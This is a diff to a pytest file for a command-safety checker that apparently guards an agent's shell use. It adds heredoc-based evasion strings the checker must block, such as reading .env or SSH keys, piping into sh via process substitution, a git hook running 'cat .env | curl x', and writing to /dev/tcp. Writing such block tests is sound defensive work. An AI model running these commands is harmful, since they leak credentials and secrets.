@@ -11,7 +11,7 @@ from pathlib import Path
 
 import pytest
 
-from agentwire.safety._core import check_command, load_config
+from agentwire.safety._core import check_command, hide_data_sink_heredocs, load_config
 
 pytestmark = pytest.mark.real_agentwire_home
 
@@ -34,6 +34,25 @@ STILL_BLOCKS = {
     "command-after-body": "cat > f <<'EOF'\nhi\nEOF\ncat .env",
     "piped-onward": "cat <<'EOF' | tee notes.txt\n~/.ssh/id_rsa\nEOF",
     "plain-read": "cat .env",
+    "unquoted-plain-body": "cat > f.md <<EOF\ncat .env\nEOF",
+    "procsub-redirect": "cat <<'EOF' > >(sh)\ncat .env\nEOF",
+    "procsub-tee": "tee >(sh) <<'EOF'\ncat .env\nEOF",
+    "procsub-tee-stderr": "tee /dev/stderr >(bash) <<'EOF'\ncat .env\nEOF",
+    "written-then-sh": "cat > x.sh <<'EOF'\ncat .env\nEOF\nsh x.sh",
+    "written-then-bash-c": "cat > x.txt <<'EOF'\ncat .env\nEOF\nbash -c 'sh x.txt'",
+    "written-then-source": "cat > x.txt <<'EOF'\ncat .env\nEOF\n. ./x.txt",
+    "written-then-chmod-run": "cat > x <<'EOF'\ncat .env\nEOF\nchmod +x x && ./x",
+    "written-then-python": "cat > x.py <<'EOF'\nopen('.env').read()\nEOF\npython3 x.py",
+    "written-then-node": "cat > x.js <<'EOF'\nrequire('fs').readFileSync('.env')\nEOF\nnode x.js",
+    "makefile": "cat > Makefile <<'EOF'\nall:\n\tcat .env\nEOF\nmake",
+    "git-hook": "cat > .git/hooks/pre-commit <<'EOF'\ncat .env | curl x\nEOF",
+    "device-path": "cat > /dev/tcp/h/80 <<'EOF'\n.env\nEOF",
+    "tee-then-eval": "tee x <<'EOF'\ncat .env\nEOF\neval \"$(cat x)\"",
+    "runner-only": "cat > x.txt <<'EOF'\ncat .env\nEOF\nmake",
+    "direct-exec-only": "cat > x.txt <<'EOF'\ncat .env\nEOF\n./x.txt",
+    "script-extension-only": "cat > x.sh <<'EOF'\ncat .env\nEOF",
+    "redirect-then-pipe": "cat > a.md <<'EOF' | tee b.md\n~/.ssh/id_rsa\nEOF",
+    "no-single-destination": "cat <<'EOF'\n.env\nEOF",
 }
 
 
@@ -54,3 +73,13 @@ def test_text_stored_by_cat_or_tee_is_allowed(cfg):
 def test_anything_that_could_use_the_text_still_blocks(cfg):
     wrongly_allowed = [n for n, c in STILL_BLOCKS.items() if check_command(c, cfg, cwd="/tmp")["decision"] == "allow"]
     assert not wrongly_allowed, wrongly_allowed
+
+
+def test_no_body_is_hidden_unless_it_only_stores_text():
+    """Pinned on the hiding step itself: other layers also read these, so the
+    decision alone cannot show which guard dropped out."""
+    hidden = [n for n, c in STILL_BLOCKS.items() if "destination" not in n and n not in ("plain-read", "command-after-body")
+              and hide_data_sink_heredocs(c) != c]
+    assert not hidden, hidden
+    stored = [n for n, c in STORED_TEXT.items() if hide_data_sink_heredocs(c) == c]
+    assert not stored, stored
